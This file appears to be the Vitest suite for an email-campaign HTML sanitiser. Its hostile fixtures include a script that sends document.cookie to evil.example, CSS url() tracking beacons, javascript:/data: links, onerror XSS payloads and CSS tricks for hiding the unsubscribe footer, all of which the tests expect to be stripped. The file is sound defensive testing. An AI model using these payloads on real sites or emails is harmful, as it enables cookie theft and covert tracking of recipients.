// Custom-HTML sanitiser — hostile fixtures. This is the security boundary
// for operator-pasted email HTML (docs/specs/custom-email-html.md): every
// smuggling route in here must come out inert, and the compliance/
// attribution passes must survive round-trips.

import { afterEach, describe, expect, it, vi } from "vitest";

import {
  combineHtml,
  escapeHtmlValue,
  htmlToPlainText,
  MAX_HTML_BYTES,
  prepareHtmlForSend,
  sanitizeCampaignHtml,
} from "@/lib/campaigns/html-import";
import { renderCampaign } from "@/lib/campaigns/render";

const ORIGIN = "https://book.tablekitapp.com";
const CID = "3b9f2b6a-1a2b-4c3d-8e9f-0a1b2c3d4e5f";

// Mirrors what the actions layer stores: markup + sanitised CSS combined.
function clean(raw: string): string {
  const r = sanitizeCampaignHtml(raw);
  if (!r.ok) throw new Error(`sanitise failed: ${r.error}`);
  return combineHtml(r);
}

describe("sanitizeCampaignHtml — hostile fixtures", () => {
  it("strips script/iframe/form/svg/object/meta/link wholesale", () => {
    const html = clean(`
      <p>keep</p>
      <script>fetch('https://evil.example?c='+document.cookie)</script>
      <iframe src="https://evil.example"></iframe>
      <form action="https://evil.example"><input name="pw"></form>
      <svg onload="alert(1)"><circle/></svg>
      <object data="https://evil.example/x.swf"></object>
      <meta http-equiv="refresh" content="0;url=https://evil.example">
      <link rel="stylesheet" href="https://evil.example/x.css">
    `);
    expect(html).toContain("keep");
    for (const bad of [
      "<script",
      "<iframe",
      "<form",
      "<input",
      "<svg",
      "<object",
      "<meta",
      "<link",
      "evil.example?c=",
    ]) {
      expect(html.toLowerCase()).not.toContain(bad);
    }
  });

  it("strips event handlers and javascript:/data: URLs", () => {
    const html = clean(`
      <img src="https://cdn.example/a.jpg" onerror="alert(1)" alt="x">
      <a href="javascript:alert(1)">click</a>
      <a href="data:text/html,<script>alert(1)</script>">click2</a>
      <p onmouseover="alert(1)">hover</p>
      <a href="//evil.example/x">protocol-relative</a>
    `);
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("onmouseover");
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("data:");
    expect(html).not.toContain("//evil.example");
    expect(html).toContain('src="https://cdn.example/a.jpg"');
  });

  it("filters style values: url() exfiltration, expression, @import — but keeps safe styles", () => {
    const html = clean(`
      <p style="color:#333333;font-size:15px;background-image:url('https://cdn.example/bg.jpg')">a</p>
      <p style="background-image:url('http://evil.example/log?x')">b</p>
      <p style="background:url(https://evil.example/log)">c</p>
      <p style="width:expression(alert(1))">d</p>
      <td style="font-family:'Helvetica Neue', Arial, sans-serif; padding: 12px 20px;">e</td>
    `);
    expect(html).toContain("color:#333333");
    expect(html).toContain("font-size:15px");
    expect(html).toMatch(/background-image:url\('https:\/\/cdn\.example\/bg\.jpg'\)/);
    expect(html).not.toContain("evil.example");
    expect(html).not.toContain("expression");
    expect(html).toMatch(/font-family:'Helvetica Neue', Arial, sans-serif/);
    expect(html).toContain("padding:12px 20px");
  });

  it("drops comments (incl. MSO conditionals) without leaking their content", () => {
    const r = sanitizeCampaignHtml(`
      <!--[if mso]><p>outlook only</p><![endif]-->
      <!-- a plain comment -->
      <p>visible</p>
    `);
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.html).toContain("visible");
    expect(r.html).not.toContain("outlook only");
    expect(r.html).not.toContain("<!--");
    expect(r.warnings.join(" ")).toMatch(/conditional/i);
  });

  it("keeps table-layout email structure intact", () => {
    const html = clean(`
      <table width="600" cellpadding="0" cellspacing="0" align="center" style="border-collapse:collapse">
        <tr><td bgcolor="#ffffff" style="padding:24px"><h1 style="text-align:center">Hello</h1></td></tr>
      </table>
    `);
    expect(html).toContain("<table");
    expect(html).toContain('width="600"');
    expect(html).toContain('bgcolor="#ffffff"');
    expect(html).toContain("border-collapse:collapse");
  });

  it("rejects empty, unrenderable and oversized input", () => {
    expect(sanitizeCampaignHtml("").ok).toBe(false);
    expect(sanitizeCampaignHtml("<script>only</script>").ok).toBe(false);
    const huge = `<p>${"x".repeat(MAX_HTML_BYTES + 1000)}</p>`;
    expect(sanitizeCampaignHtml(huge).ok).toBe(false);
  });

  it("warns (not rejects) above the Gmail clipping threshold", () => {
    const r = sanitizeCampaignHtml(`<p>${"x".repeat(120_000)}</p>`);
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.warnings.join(" ")).toMatch(/clips/i);
  });
});

describe("responsive CSS import (sanitised + scoped)", () => {
  it("keeps @media rules and class attributes — the mobile-stacking path", () => {
    const r = sanitizeCampaignHtml(`
      <style>
        .stack { width: 600px; }
        @media only screen and (max-width: 600px) {
          .stack { display: block !important; width: 100% !important; }
          .mobile-hide { display: none; }
        }
      </style>
      <table class="stack"><tr><td class="mobile-hide">wide only</td><td>always</td></tr></table>
    `);
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.css).toContain("@media only screen and (max-width: 600px)");
    expect(r.css).toContain("display: block !important");
    // Selectors are scoped so pasted CSS can only style pasted content.
    expect(r.css).toContain(".tk-content .stack");
    expect(r.css).toContain(".tk-content .mobile-hide");
    // Class attributes survive on the markup so the rules actually match.
    expect(r.html).toContain('class="stack"');
    // Clean import → no scary warnings.
    expect(r.warnings.filter((w) => /style/i.test(w))).toEqual([]);
  });

  it("filters hostile CSS: url() exfil, @import, @font-face, unknown props — with a warning", () => {
    const r = sanitizeCampaignHtml(`
      <style>
        @import url('https://evil.example/x.css');
        @font-face { font-family: X; src: url('https://evil.example/f.woff'); }
        .a { background-image: url('http://evil.example/spy?x'); color: #333333; }
        .b { position: fixed; behavior: url('https://evil.example'); }
        .c { background-image: url('https://cdn.example/ok.jpg'); }
      </style>
      <p class="a">hi</p>
    `);
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.css).not.toContain("@import");
    expect(r.css).not.toContain("@font-face");
    expect(r.css).not.toContain("evil.example");
    expect(r.css).not.toContain("position");
    expect(r.css).toContain("color: #333333");
    expect(r.css).toContain("url('https://cdn.example/ok.jpg')");
    expect(r.warnings.join(" ")).toMatch(/couldn't be imported safely/i);
  });

  it("scopes html/body selectors to the content wrapper (footer can't be hidden)", () => {
    const r = sanitizeCampaignHtml(
      `<style>body { display: none; } p { display: none; }</style><p>x</p>`,
    );
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    // Both rules end up under .tk-content — our footer lives outside it.
    expect(r.css).toContain(".tk-content {");
    expect(r.css).toContain(".tk-content p");
    expect(r.css).not.toMatch(/^\s*body\s*\{/m);
    expect(r.css).not.toMatch(/(^|\})\s*p\s*\{/);
  });

  it("drops sibling-combinator selectors that reach past the wrapper to the footer", () => {
    // The footer <Container> is a DOM sibling of .tk-content, so a sibling
    // combinator glued to the scope root escapes it. All of these must be
    // dropped (not passed through), so the unsubscribe footer can't be hidden.
    for (const hostile of [
      `<style>.tk-content ~ * { display: none !important }</style><p>x</p>`,
      `<style>.tk-content + * { display: none }</style><p>x</p>`,
      `<style>~ * { display: none }</style><p>x</p>`,
      `<style>.tk-content~*{visibility:hidden}</style><p>x</p>`,
      // CSS comment glued in place of whitespace — a mail client reads this
      // as `.tk-content ~ *`; the sanitiser must too.
      `<style>.tk-content/**/~ *{display:none}</style><p>x</p>`,
      `<style>.tk-content/*x*/~*{opacity:0}</style><p>x</p>`,
    ]) {
      const r = sanitizeCampaignHtml(hostile);
      expect(r.ok).toBe(true);
      if (!r.ok) return;
      expect(r.css).not.toMatch(/\.tk-content(\/\*[\s\S]*?\*\/|\s)*[~+]/);
      expect(r.warnings.length).toBeGreaterThan(0); // operator warned it was modified
    }
  });

  it("treats .tk-content-prefixed classes as different elements, not the scope root", () => {
    // `.tk-content-x` shares the prefix but is a DIFFERENT class — it must be
    // scoped as a descendant (prefixed), never passed through as if it were
    // our wrapper, so `.tk-content-x ~ *` can't reach the footer.
    const r = sanitizeCampaignHtml(`<style>.tk-content-x ~ * { display: none }</style><p>x</p>`);
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.css).toContain(".tk-content .tk-content-x");
    expect(r.css).not.toMatch(/(^|,|\})\s*\.tk-content-x\s*~/);
  });

  it("keeps sibling combinators that stay inside the wrapper subtree", () => {
    const r = sanitizeCampaignHtml(
      `<style>.a ~ .b { color: #111 } .a + .b { color: #222 }</style><p class="a">x</p><p class="b">y</p>`,
    );
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    // Prefixed under the wrapper — the sibling match resolves among the
    // operator's own descendants, never the footer.
    expect(r.css).toContain(".tk-content .a ~ .b");
    expect(r.css).toContain(".tk-content .a + .b");
  });
});

describe("prepareHtmlForSend", () => {
  it("rewrites booking-surface links with tk_c and leaves external links alone", () => {
    const r = sanitizeCampaignHtml(
      `<a href="${ORIGIN}/book/janes?party=2">book</a> <a href="https://janes.example/menu">menu</a>`,
    );
    if (!r.ok) throw new Error(r.error);
    const sent = prepareHtmlForSend(combineHtml(r), { campaignId: CID, widgetOrigin: ORIGIN });
    expect(sent.html).toContain(`tk_c=${CID}`);
    expect(sent.html).toContain("party=2");
    expect(sent.html).toContain('href="https://janes.example/menu"');
  });

  it("is itself a sanitising pass and re-scopes CSS idempotently", () => {
    // Simulate a hostile string reaching the send path directly.
    const sent = prepareHtmlForSend(
      "<style>.x{color:#111111}</style><p>ok</p><script>alert(1)</script>",
      { campaignId: CID, widgetOrigin: ORIGIN },
    );
    expect(sent.html).toContain("ok");
    expect(sent.html).not.toContain("script");
    expect(sent.css).toContain(".tk-content .x");

    // Round-trip: already-scoped CSS must not get double-prefixed.
    const again = prepareHtmlForSend(`<style>${sent.css}</style>${sent.html}`, {
      campaignId: CID,
      widgetOrigin: ORIGIN,
    });
    expect(again.css).toContain(".tk-content .x");
    expect(again.css).not.toContain(".tk-content .tk-content");
  });
});

describe("renderCampaign with custom HTML (end-to-end)", () => {
  afterEach(() => vi.unstubAllEnvs());

  it("forces the compliance footer, stamps tk_c, and escapes merge-tag values", async () => {
    vi.stubEnv("NEXT_PUBLIC_WIDGET_URL", ORIGIN);
    {
      const cleaned = clean(
        `<style>@media (max-width:600px){.w{width:100%}}</style><table class="w"><tr><td><h1>Hi {{guestFirstName}}</h1><a href="${ORIGIN}/book/janes">Book</a></td></tr></table>`,
      );
      const r = await renderCampaign({
        channel: "email",
        subject: "News",
        body: "fallback",
        htmlBody: cleaned,
        ctx: {
          // Hostile guest name — must come out escaped, never as markup.
          guestFirstName: "<img src=x onerror=alert(1)>",
          venueName: "Jane's Café",
          unsubscribeUrl: `${ORIGIN}/unsubscribe?p=abc`,
          campaignId: CID,
        },
      });
      expect(r.kind).toBe("email");
      if (r.kind !== "email") return;
      // React interleaves `<!-- -->` between text segments — match loosely.
      expect(r.rendered.html).toMatch(/Unsubscribe from .*Jane&#x27;s Café.* emails/);
      expect(r.rendered.html).toMatch(/Sent by .*Jane&#x27;s Café.* via TableKit/);
      expect(r.rendered.html).toContain(`href="${ORIGIN}/unsubscribe?p=abc"`);
      expect(r.rendered.html).toContain(`tk_c=${CID}`);
      expect(r.rendered.html).toContain("&lt;img src=x onerror=alert(1)&gt;");
      expect(r.rendered.html).not.toContain("<img src=x");
      // Responsive CSS lands in <head>, scoped; markup keeps its classes.
      expect(r.rendered.html).toContain("<style>");
      expect(r.rendered.html).toContain(".tk-content .w");
      expect(r.rendered.html).toContain('class="tk-content"');
      expect(r.rendered.html).toContain('class="w"');
      // Structural footer-isolation: .tk-content is nested in .tk-shell, and
      // the unsubscribe footer lives AFTER (outside) .tk-shell — so it is not
      // a sibling of .tk-content and no operator selector rooted there (incl.
      // `.tk-content:not(x) ~ *`) can reach it.
      expect(r.rendered.html).toContain('class="tk-shell"');
      const shellClose = r.rendered.html.indexOf("Unsubscribe from");
      const contentAt = r.rendered.html.indexOf('class="tk-content"');
      expect(contentAt).toBeGreaterThan(-1);
      expect(shellClose).toBeGreaterThan(contentAt); // footer comes after the content shell
      // Plain-text part exists and carries the content.
      expect(r.rendered.text).toContain("Unsubscribe");
    }
  });
});

describe("helpers", () => {
  it("escapeHtmlValue neutralises markup in merge-tag values", () => {
    expect(escapeHtmlValue(`<img onerror=x>&"'`)).toBe("&lt;img onerror=x&gt;&amp;&quot;&#39;");
  });

  it("htmlToPlainText extracts readable text", () => {
    const text = htmlToPlainText("<table><tr><td><h1>Hi</h1><p>There friend</p></td></tr></table>");
    expect(text).toContain("Hi");
    expect(text).toContain("There friend");
    expect(text).not.toContain("<");
  });
});
